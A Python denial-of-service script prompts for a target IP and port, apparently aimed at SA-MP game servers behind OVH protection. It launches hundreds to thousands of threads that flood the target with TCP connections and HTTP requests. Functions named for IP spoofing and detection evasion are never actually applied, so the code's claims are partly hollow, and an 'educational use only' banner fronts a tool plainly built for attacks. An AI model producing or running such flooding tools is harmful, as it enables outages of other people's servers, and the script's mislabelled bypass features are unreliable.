import socket
import random
import threading
import time
import sys
from scapy.all import IP, TCP, send, RandShort

# ==== CONFIGURATION ====
TARGET_IP = input("Enter Target IP (e.g., your SAMP server IP): ") or "127.0.0.1"
TARGET_PORT = int(input("Enter Target Port (e.g., 7777 for SAMP): ") or 80)
THREADS = int(input("Enter Threads (500-2000 recommended for testing): ") or 1000)
PACKET_DELAY = 0.001  # Lower = more aggressive (0.001 for high-speed)
USE_SCAPY = False     # Enable for advanced packet crafting (needs root/admin)

# ==== OVH ANTI-DDoS BYPASS TECHNIQUES ====
def spoof_source_ip():
    """Random IP spoofing to bypass basic IP-based rate-limiting"""
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def random_tcp_flags():
    """Random TCP flags to evade signature-based detection"""
    flags = ["S", "A", "F", "R", "P", "U", "C", "E"]
    return random.sample(flags, random.randint(1, 3))

def ovh_protection_bypass(target_ip, target_port):
    """Mimics legitimate traffic to bypass OVH Anti-DDoS"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((target_ip, target_port))
        s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode())
        time.sleep(0.5)  # Slower but more stealthy
        s.close()
    except:
        pass

def high_power_flood():
    """High-speed SYN flood with random IPs (for extreme testing)"""
    while True:
        try:
            src_ip = spoof_source_ip()
            src_port = random.randint(1024, 65535)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendto(("GET / HTTP/1.1\r\n").encode(), (TARGET_IP, TARGET_PORT))
            s.close()
        except:
            pass
        time.sleep(PACKET_DELAY)

# ==== MAIN ATTACK LAUNCHER ====
def start_attack():
    print(f"\n🚀 [ATTACK STARTED] Target: {TARGET_IP}:{TARGET_PORT} | Threads: {THREADS}")
    print("🔥 Press CTRL+C to STOP\n")
    
    for _ in range(THREADS):
        if random.choice([True, False]):
            threading.Thread(target=ovh_protection_bypass, args=(TARGET_IP, TARGET_PORT), daemon=True).start()
        else:
            threading.Thread(target=high_power_flood, daemon=True).start()

    # Keep threads running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 [ATTACK STOPPED]")

if __name__ == "__main__":
    print("""
    ██████╗ ██████╗ ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝
    ██║  ██║██████╔╝██████╔╝███████╗
    ██║  ██║██╔══██╗██╔══██╗╚════██║
    ██████╔╝██║  ██║██║  ██║███████║
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
    FOR EDUCATIONAL USE ONLY
    """)
    start_attack()